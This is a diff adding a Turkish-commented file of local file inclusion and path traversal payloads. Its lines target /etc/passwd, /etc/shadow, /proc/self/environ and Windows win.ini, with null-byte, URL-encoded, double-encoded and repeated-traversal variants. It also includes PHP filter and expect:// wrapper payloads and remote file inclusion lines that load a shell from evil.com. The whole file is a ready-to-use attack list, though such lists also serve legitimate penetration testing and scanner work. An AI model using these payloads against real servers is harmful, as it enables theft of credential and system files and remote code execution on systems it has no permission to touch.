@@ -1,0 +1,54 @@
+# lfi / path traversal test payloadları
+# linux hedefler
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/hostname
+../../../proc/self/environ
+
+# null byte bypass
+../../../etc/passwd%00
+../../../etc/passwd%00.html
+../../../etc/passwd%00.php
+../../../etc/passwd%00.jpg
+
+# url encoding
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+
+# double encoding
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+
+# tekrarlı traversal
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+..../..../..../etc/passwd
+
+# windows hedefler
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+..%5c..%5c..%5cwindows%5cwin.ini
+..%255c..%255c..%255cwindows%255cwin.ini
+
+# wrapper bypass
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=../../../etc/passwd
+file:///etc/passwd
+expect://id
+
+# proc filesystem ve rfi
+/proc/self/environ
+/proc/self/fd/1
+/var/log/apache2/access.log
+http://evil.com/shell.txt
+https://evil.com/shell.txt
+
